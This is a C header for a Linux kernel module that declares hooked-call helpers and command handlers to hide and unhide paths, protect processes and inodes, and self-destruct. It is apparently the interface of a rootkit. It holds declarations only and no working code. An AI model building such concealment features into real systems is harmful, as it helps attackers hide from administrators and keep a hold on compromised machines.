#pragma once
#include <linux/module.h>
#include <linux/path.h>

typedef bool cmd_handler_t(char *arg, uint64_t len);

bool cmds_install(void);
void cmds_uninstall(void);

// command helpers (used by hooked calls and stuff)
bool is_path_protected(struct path *p);
bool is_process_protected(pid_t pid);
bool is_inode_protected(uint64_t inode);
bool is_path_hidden(struct path *p);
bool is_cmd_path(struct path *p);
bool protect_pid(pid_t pid);

// command handlers
cmd_handler_t cmd_destruct;
cmd_handler_t cmd_protect;
cmd_handler_t cmd_unhide;
cmd_handler_t cmd_check;
cmd_handler_t cmd_hide;
